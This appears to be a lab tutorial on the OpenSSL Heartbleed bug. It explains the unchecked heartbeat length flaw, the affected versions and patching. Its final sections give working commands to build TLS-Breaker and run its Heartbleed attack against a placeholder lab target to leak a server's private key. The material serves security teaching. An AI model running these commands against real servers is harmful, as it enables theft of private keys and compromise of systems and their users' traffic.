# Heartbleed Bug

The Heartbleed Bug is a significant example of an implementation flaw in a cryptographic library that provides algorithms for TLS, resulting in a high-impact vulnerability across a vast number of TLS servers.

## The Heartbleed Bug

TLS functionality can be extended through various extensions, one of which is the Heartbeat extension. This extension serves to verify if a current TLS connection is still active. Specifically, a client sends a `Heartbeat Request` message to the server, expecting a response. Receiving the anticipated response confirms that the server is still operational and the connection is alive.

The `Heartbeat Request` message comprises an arbitrary payload chosen by the client, along with the declared length of that payload. The server is expected to copy this payload into memory and then send it back as a response. For instance, a client might send `("HackTheBox", 10)` to the server, which would then reply with `"HackTheBox"`.

However, a critical bug existed in specific OpenSSL versions implementing the Heartbeat extension: they failed to validate the payload length declared by the client. This vulnerability allowed a malicious client to send a small payload but declare a much larger length. Consequently, the server would read and return data from its memory far beyond the actual payload received in the heartbeat message. For example, if an attacker sent a heartbeat message `("HackTheBox", 1024)`, the server would respond with 1024 bytes of data, starting from the memory location where "HackTheBox" was stored. This action would leak the contents of the server's memory to the client, which could include highly sensitive information such as the server's private key, potentially leading to a complete compromise of the system.

Since the Heartbeat extension was enabled by default in the vulnerable OpenSSL versions, a substantial number of servers were affected by this bug, making it a very serious threat at the time of its discovery.

## Tools & Prevention

To exploit the Heartbleed Bug, the TLS-Breaker tool collection can be utilized. The Heartbleed detection tool can be run as follows:

```bash
java -jar apps/heartbleed-1.0.1.jar -connect 127.0.0.1:443
```

A vulnerable server will typically respond with a `VULNERABLE` status, indicating that it incorrectly processes heartbeat messages with invalid length values.

If a server is vulnerable, the attack can be executed to retrieve the server's private key using the `-executeAttack` flag. It may be beneficial to increase the number of heartbeat messages sent with the `-heartbeats` flag. The tool automatically parses the dumped memory to retrieve the private key. As the attack is not deterministic, multiple executions might be necessary to succeed.

**Prevention:**

Preventing the Heartbleed Bug is straightforward as it is a bug specific to the OpenSSL library. The primary requirement is to ensure that a web server does not run a vulnerable version of OpenSSL. Specifically, vulnerable versions include OpenSSL 1.0.1 through 1.0.1f. Regularly updating OpenSSL to a patched version is essential for protection.

### Exploitation Details

To exploit the Heartbleed bug, you first need to install TLS-Breaker (if not already installed):

```bash
sudo apt install maven
git clone https://github.com/tls-attacker/TLS-Breaker
cd TLS-Breaker/
mvn clean install -DskipTests=true
```

Verify your Java installation as TLS-Breaker expects JDK 11 (e.g., `/usr/lib/jvm/java-1.11.0-openjdk-amd64`):

```bash
update-java-alternatives --list
```

Subsequently, you can exploit Heartbleed with `heartbleed-1.0.1.jar` to leak the server's private key. It is recommended to specify a higher number for the `-heartbeats` option (e.g., 20); since this attack is non-deterministic, you may need to retry it until the private key is leaked. The output can be piped to `grep` to display specific parts of the private key, such as the first 10 digits of `d`:

```bash
/usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar apps/heartbleed-1.0.1.jar -connect STMIP:STMPO -executeAttack -heartbeats 20 | grep -Eo "d = [0-9]{1,10}"
```
